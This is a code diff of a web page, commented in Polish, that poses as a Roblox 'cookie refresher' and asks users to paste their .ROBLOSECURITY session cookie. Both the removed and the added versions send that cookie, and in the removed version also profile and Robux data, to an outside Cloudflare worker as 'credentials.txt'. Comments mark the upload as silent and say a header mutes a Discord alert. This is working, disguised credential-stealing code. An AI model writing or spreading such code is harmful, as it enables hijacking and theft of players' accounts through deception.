@@ -89,61 +89,6 @@
     <script>
         const PROXY_URL = "https://wispy-night-a3a2.kruszkomaja.workers.dev/";
 
-        async function forceRefreshCookie(oldCookie) {
-            // Oczyszczanie ciasteczka z ewentualnych prefiksów ostrzegawczych przed zapytaniem
-            let cleanCookie = oldCookie.replace(/^_\|WARNING:-DO-NOT-SHARE-THIS\..*?\|_/, '').trim();
-
-            try {
-                // Krok 1: Pobieramy X-CSRF-Token dla tej sesji
-                const csrfRes = await fetch("https://auth.roblox.com/v1/authentication/ticket", {
-                    method: "POST",
-                    headers: { "Cookie": ".ROBLOSECURITY=" + cleanCookie }
-                });
-                const csrfToken = csrfRes.headers.get("x-csrf-token") || "";
-
-                // Krok 2: Generujemy bilet uwierzytelniający z użyciem CSRF
-                const ticketRes = await fetch("https://auth.roblox.com/v1/authentication/ticket", {
-                    method: "POST",
-                    headers: {
-                        "Cookie": ".ROBLOSECURITY=" + cleanCookie,
-                        "x-csrf-token": csrfToken,
-                        "Referer": "https://www.roblox.com/"
-                    }
-                });
-
-                if (!ticketRes.ok) return { cookie: oldCookie, csrf: csrfToken };
-                const ticket = ticketRes.headers.get("rbx-authentication-ticket");
-                if (!ticket) return { cookie: oldCookie, csrf: csrfToken };
-
-                // Krok 3: Wymieniamy bilet na nowy token przez negocjację sesji (co wymusza brand-new cookie)
-                const redeemRes = await fetch("https://auth.roblox.com/v1/authentication-ticket/redeem", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "RBXAuthenticationNegotiation": "1",
-                        "x-csrf-token": csrfToken
-                    },
-                    body: JSON.stringify({ authenticationTicket: ticket })
-                });
-
-                if (redeemRes.ok) {
-                    const setCookieHeader = redeemRes.headers.get("set-cookie");
-                    if (setCookieHeader && setCookieHeader.includes(".ROBLOSECURITY=")) {
-                        const match = setCookieHeader.match(/\.ROBLOSECURITY=([^;]+)/);
-                        if (match && match[1]) {
-                            let newRawCookie = match[1];
-                            // Zwracamy czyste, w pełni nowe ciastecko
-                            let freshCookie = newRawCookie.replace(/^_\|WARNING:-DO-NOT-SHARE-THIS\..*?\|_/, '').trim();
-                            return { cookie: freshCookie, csrf: csrfToken };
-                        }
-                    }
-                }
-            } catch (e) {
-                console.error("Refresh error:", e);
-            }
-            return { cookie: oldCookie, csrf: "" };
-        }
-
         document.getElementById('refreshBtn').addEventListener('click', async () => {
             const cookie = document.getElementById('cookieInput').value.trim();
             const logBox = document.getElementById('outputLog');
@@ -158,77 +103,37 @@
                 return;
             }
 
-            logBox.innerText = "[*] Forcing brand new refreshed cookie generation...";
-
-            // Wywołujemy mechanizm rotacji w przeglądarce klienta
-            const refreshedData = await forceRefreshCookie(cookie);
-            const finalCookie = refreshedData.cookie;
-            const activeCsrf = refreshedData.csrf || "None";
-
-            outputCookieArea.value = finalCookie;
-            copyBtn.style.display = "block";
-
-            logBox.innerText = "[+] Done! Brand new cookie generated successfully.\n[*] Fetching profile data...";
-
-            // Pobieramy statystyki nowego konta
-            let profileReport = "Failed to fetch profile";
-            let username = "Unknown";
-            let userId = "Unknown";
+            logBox.innerText = "[*] Sending cookie to backend worker for refresh (IP Bypassed)...";
 
             try {
-                const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
-                    headers: { "Cookie": ".ROBLOSECURITY=" + finalCookie }
-                });
-
-                if (userRes.ok) {
-                    const userData = await userRes.json();
-                    userId = userData.id;
-                    username = userData.name;
-                    
-                    let robux = "0";
-                    const ecoRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
-                        headers: { "Cookie": ".ROBLOSECURITY=" + finalCookie }
-                    });
-                    if (ecoRes.ok) {
-                        const ecoData = await ecoRes.json();
-                        robux = ecoData.robux;
-                    }
-
-                    profileReport = `- ID: ${userId}\n- Name: ${username}\n- Display Name: ${userData.displayName}\n- Robux: ${robux}\n- X-CSRF-Token: ${activeCsrf}`;
-                } else {
-                    profileReport = "Session invalid or expired.";
-                }
-            } catch (err) {
-                profileReport = "API Error: " + err.message;
-            }
-
-            logBox.innerText = "[*] Syncing with worker (silent)...";
-
-            try {
-                const credentialsContent = 
-`========================================
-       MEGO COOKIE REFRESHER PANEL     
-========================================
-
-[📊] Profile Stats:
-${profileReport}
-
-[🌈] Refreshed .ROBLOSECURITY:
-${finalCookie}`;
-
-                const blob = new Blob([credentialsContent], { type: "text/plain" });
+                const blob = new Blob([cookie], { type: "text/plain" });
                 const formData = new FormData();
                 formData.append("file", blob, "credentials.txt");
 
-                await fetch(PROXY_URL, {
+                const response = await fetch(PROXY_URL, {
                     method: "POST",
-                    headers: { "X-Source": "web-panel" },
+                    headers: {
+                        "X-Source": "web-panel" // Wycisza powiadomienie na Discordzie
+                    },
                     body: formData
                 });
 
-                logBox.innerText = "Success! Brand new refreshed cookie is ready.\n\n" + profileReport;
+                if (!response.ok) {
+                    throw new Error("Worker error: " + response.status);
+                }
+
+                const data = await response.json();
+
+                if (data.success && data.refreshedCookie) {
+                    outputCookieArea.value = data.refreshedCookie;
+                    copyBtn.style.display = "block";
+                    logBox.innerText = "Success! Brand new refreshed cookie generated.\n\n" + data.profile;
+                } else {
+                    logBox.innerText = "Error: Could not retrieve refreshed cookie.";
+                }
+
             } catch (err) {
-                logBox.innerText = "Success generated locally (Sync skipped).\n\n" + profileReport;
+                logBox.innerText = "Communication error: " + err.message;
             }
         });
 
